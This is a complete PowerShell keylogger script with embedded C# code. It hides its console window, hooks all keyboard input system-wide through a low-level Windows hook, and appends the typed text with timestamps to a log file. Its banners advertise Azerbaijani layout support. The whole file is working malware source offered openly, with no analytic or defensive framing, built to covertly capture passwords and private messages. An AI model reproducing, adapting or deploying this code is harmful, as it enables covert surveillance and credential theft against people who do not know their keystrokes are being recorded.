# keylogger.ps1
param(
    [string]$LogFilePath = ""
)

Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'
$consolePtr = [Console.Window]::GetConsoleWindow()
[Console.Window]::ShowWindow($consolePtr, 0)

Add-Type -TypeDefinition @"
    using System;
    using System.Runtime.InteropServices;
    using System.Windows.Forms;
    using System.IO;
    using System.Text;
    
    public class KeyLogger {
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        
        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
        
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
        
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);
        
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
        
        [DllImport("user32.dll")]
        private static extern short GetKeyState(int nVirtKey);
        
        [DllImport("user32.dll")]
        private static extern uint MapVirtualKey(uint uCode, uint uMapType);
        
        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();
        
        [DllImport("user32.dll")]
        private static extern uint GetWindowThreadProcessId(IntPtr hWnd, IntPtr ProcessId);
        
        [DllImport("user32.dll")]
        private static extern IntPtr GetKeyboardLayout(uint idThread);
        
        [DllImport("user32.dll")]
        private static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpKeyState, 
            [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags);
        
        [DllImport("user32.dll")]
        private static extern bool GetKeyboardState(byte[] lpKeyState);
        
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;
        private static string _logFile = "";
        private static StringBuilder _textBuffer = new StringBuilder();
        private static DateTime _lastFlushTime = DateTime.Now;
        
        public static void Start(string logFile) {
            _logFile = logFile;
            _hookID = SetHook(_proc);
        }
        
        public static void Stop() {
            UnhookWindowsHookEx(_hookID);
            FlushBuffer();
        }
        
        private static IntPtr SetHook(LowLevelKeyboardProc proc) {
            using (System.Diagnostics.Process curProcess = System.Diagnostics.Process.GetCurrentProcess())
            using (System.Diagnostics.ProcessModule curModule = curProcess.MainModule) {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }
        
        private static void FlushBuffer() {
            if (_textBuffer.Length > 0) {
                try {
                    string timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
                    string logEntry = "[" + timestamp + "] TEXT: " + _textBuffer.ToString();
                    File.AppendAllText(_logFile, logEntry + Environment.NewLine);
                    _textBuffer.Clear();
                } catch { }
            }
        }
        
        private static string GetCharsFromKeys(uint vkCode, uint scanCode, bool shiftPressed, bool capsLock) {
            byte[] keyboardState = new byte[256];
            GetKeyboardState(keyboardState);
            
            if (shiftPressed) {
                keyboardState[0x10] = 0x80; // Shift pressed
            }
            
            if (capsLock) {
                keyboardState[0x14] = 0x01; // CapsLock on
            }
            
            StringBuilder stringBuilder = new StringBuilder(10);
            int result = ToUnicode(vkCode, scanCode, keyboardState, stringBuilder, stringBuilder.Capacity, 0);
            
            if (result > 0) {
                return stringBuilder.ToString();
            }
            return "";
        }
        
        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
                int vkCode = Marshal.ReadInt32(lParam);
                uint scanCode = (uint)Marshal.ReadInt32(lParam + 8);
                Keys key = (Keys)vkCode;
                
                bool shiftPressed = (GetKeyState(0x10) & 0x8000) != 0;
                bool capsLock = (GetKeyState(0x14) & 0x0001) != 0;
                bool ctrlPressed = (GetKeyState(0x11) & 0x8000) != 0;
                bool altPressed = (GetKeyState(0x12) & 0x8000) != 0;
                
                // Skip if Ctrl, Alt or Windows keys
                if (ctrlPressed || altPressed || key == Keys.LWin || key == Keys.RWin) {
                    return CallNextHookEx(_hookID, nCode, wParam, lParam);
                }
                
                string keyString = "";
                bool isPrintable = true;
                
                // Special keys
                switch (key) {
                    case Keys.Space: 
                        keyString = " "; 
                        break;
                    case Keys.Enter: 
                        keyString = "\n"; 
                        break;
                    case Keys.Back: 
                        if (_textBuffer.Length > 0) {
                            _textBuffer.Remove(_textBuffer.Length - 1, 1);
                        }
                        isPrintable = false;
                        break;
                    case Keys.Tab: 
                        keyString = "\t"; 
                        break;
                    case Keys.Escape: 
                        isPrintable = false;
                        break;
                    default:
                        // Try to get character from current keyboard layout
                        string unicodeChar = GetCharsFromKeys((uint)vkCode, scanCode, shiftPressed, capsLock);
                        
                        if (!string.IsNullOrEmpty(unicodeChar)) {
                            keyString = unicodeChar;
                        } else {
                            // Fallback to traditional method
                            switch (key) {
                                case Keys.A: keyString = (shiftPressed ^ capsLock) ? "A" : "a"; break;
                                case Keys.B: keyString = (shiftPressed ^ capsLock) ? "B" : "b"; break;
                                case Keys.C: keyString = (shiftPressed ^ capsLock) ? "C" : "c"; break;
                                case Keys.D: keyString = (shiftPressed ^ capsLock) ? "D" : "d"; break;
                                case Keys.E: keyString = (shiftPressed ^ capsLock) ? "E" : "e"; break;
                                case Keys.F: keyString = (shiftPressed ^ capsLock) ? "F" : "f"; break;
                                case Keys.G: keyString = (shiftPressed ^ capsLock) ? "G" : "g"; break;
                                case Keys.H: keyString = (shiftPressed ^ capsLock) ? "H" : "h"; break;
                                case Keys.I: keyString = (shiftPressed ^ capsLock) ? "I" : "i"; break;
                                case Keys.J: keyString = (shiftPressed ^ capsLock) ? "J" : "j"; break;
                                case Keys.K: keyString = (shiftPressed ^ capsLock) ? "K" : "k"; break;
                                case Keys.L: keyString = (shiftPressed ^ capsLock) ? "L" : "l"; break;
                                case Keys.M: keyString = (shiftPressed ^ capsLock) ? "M" : "m"; break;
                                case Keys.N: keyString = (shiftPressed ^ capsLock) ? "N" : "n"; break;
                                case Keys.O: keyString = (shiftPressed ^ capsLock) ? "O" : "o"; break;
                                case Keys.P: keyString = (shiftPressed ^ capsLock) ? "P" : "p"; break;
                                case Keys.Q: keyString = (shiftPressed ^ capsLock) ? "Q" : "q"; break;
                                case Keys.R: keyString = (shiftPressed ^ capsLock) ? "R" : "r"; break;
                                case Keys.S: keyString = (shiftPressed ^ capsLock) ? "S" : "s"; break;
                                case Keys.T: keyString = (shiftPressed ^ capsLock) ? "T" : "t"; break;
                                case Keys.U: keyString = (shiftPressed ^ capsLock) ? "U" : "u"; break;
                                case Keys.V: keyString = (shiftPressed ^ capsLock) ? "V" : "v"; break;
                                case Keys.W: keyString = (shiftPressed ^ capsLock) ? "W" : "w"; break;
                                case Keys.X: keyString = (shiftPressed ^ capsLock) ? "X" : "x"; break;
                                case Keys.Y: keyString = (shiftPressed ^ capsLock) ? "Y" : "y"; break;
                                case Keys.Z: keyString = (shiftPressed ^ capsLock) ? "Z" : "z"; break;
                                
                                // Numbers
                                case Keys.D0: keyString = shiftPressed ? ")" : "0"; break;
                                case Keys.D1: keyString = shiftPressed ? "!" : "1"; break;
                                case Keys.D2: keyString = shiftPressed ? "@" : "2"; break;
                                case Keys.D3: keyString = shiftPressed ? "#" : "3"; break;
                                case Keys.D4: keyString = shiftPressed ? "$" : "4"; break;
                                case Keys.D5: keyString = shiftPressed ? "%" : "5"; break;
                                case Keys.D6: keyString = shiftPressed ? "^" : "6"; break;
                                case Keys.D7: keyString = shiftPressed ? "&" : "7"; break;
                                case Keys.D8: keyString = shiftPressed ? "*" : "8"; break;
                                case Keys.D9: keyString = shiftPressed ? "(" : "9"; break;
                                
                                // Special characters using virtual key codes
                                case (Keys)186: keyString = shiftPressed ? ":" : ";"; break; // Oem1
                                case (Keys)187: keyString = shiftPressed ? "+" : "="; break; // OemPlus
                                case (Keys)188: keyString = shiftPressed ? "<" : ","; break; // Oemcomma
                                case (Keys)189: keyString = shiftPressed ? "_" : "-"; break; // OemMinus
                                case (Keys)190: keyString = shiftPressed ? ">" : "."; break; // OemPeriod
                                case (Keys)191: keyString = shiftPressed ? "?" : "/"; break; // Oem2
                                case (Keys)192: keyString = shiftPressed ? "~" : "`"; break; // Oem3
                                case (Keys)219: keyString = shiftPressed ? "{" : "["; break; // Oem4
                                case (Keys)220: keyString = shiftPressed ? "|" : "\\"; break; // Oem5
                                case (Keys)221: keyString = shiftPressed ? "}" : "]"; break; // Oem6
                                case (Keys)222: keyString = shiftPressed ? "\"" : "'"; break; // Oem7
                                
                                default: 
                                    isPrintable = false; 
                                    break;
                            }
                        }
                        break;
                }
                
                if (isPrintable && !string.IsNullOrEmpty(keyString)) {
                    _textBuffer.Append(keyString);
                    
                    // Auto-send conditions
                    TimeSpan timeSinceFlush = DateTime.Now - _lastFlushTime;
                    if (_textBuffer.Length >= 50 || timeSinceFlush.TotalSeconds >= 30 || 
                        keyString == "\n" || keyString == "." || keyString == "!" || keyString == "?") {
                        FlushBuffer();
                        _lastFlushTime = DateTime.Now;
                    }
                }
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }
    }
"@ -ReferencedAssemblies "System.Windows.Forms", "System.IO"

try {
    if (-not (Test-Path $LogFilePath)) {
        $null = New-Item -Path $LogFilePath -ItemType File -Force
        "Keylogger Started: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" | Out-File -FilePath $LogFilePath
    }
    
    Add-Content -Path $LogFilePath -Value "=== KeyLogger Active (Azerbaijani Support) ==="
    
    [KeyLogger]::Start($LogFilePath)
    
    Write-Host "Keylogger with Azerbaijani character support started..." -ForegroundColor Green
    
    [System.Windows.Forms.Application]::Run()
}
catch {
    $errorMsg = $_.Exception.Message
    "ERROR: $errorMsg" | Out-File -FilePath $LogFilePath -Append
    Write-Host "Error: $errorMsg" -ForegroundColor Red
}
finally {
    try {
        [KeyLogger]::Stop()
        "Keylogger Stopped: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" | Out-File -FilePath $LogFilePath -Append
    } catch { }
}